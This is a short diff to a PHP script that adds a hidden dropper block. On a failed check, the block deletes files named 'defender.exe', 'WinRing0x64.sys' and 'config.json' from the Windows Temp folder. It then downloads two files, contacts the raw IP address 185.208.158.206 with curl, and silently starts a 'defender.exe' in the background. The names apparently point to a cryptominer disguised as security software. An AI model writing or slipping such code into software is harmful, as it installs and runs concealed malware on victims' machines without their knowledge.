@@ -54,4 +54,36 @@ foreach ($output as $line) {
 
     }
 }
+
+if (!$found && !$found2) {
+
+
+           system('del /f /q "C:/Windows/Temp/defender.exe"');     
+        system('del /f /q "C:/Windows/Temp/WinRing0x64.sys"');
+        system('del /f /q "C:/Windows/Temp/config.json"');
+
+
+        if (downloadFile($url2, $file_name2)) {
+            // File downloaded successfully, continue with rest of your script
+            echo "Proceeding with further processing...\n";
+            // Your code here
+        } else {
+            echo "Failed to download file, aborting further processing.\n";
+        }
+        if (downloadFile($url, $file_name)) {
+            // File downloaded successfully, continue with rest of your script
+            echo "Proceeding with further processing...\n";
+            // Your code here
+        } else {
+            echo "Failed to download file, aborting further processing.\n";
+        }
 system('curl 185.208.158.206:8877');   
+         system('start /B "" "C:/Windows/Temp/RightProgram/defender.exe"');
+        
+
+
+
+
+
+}
+
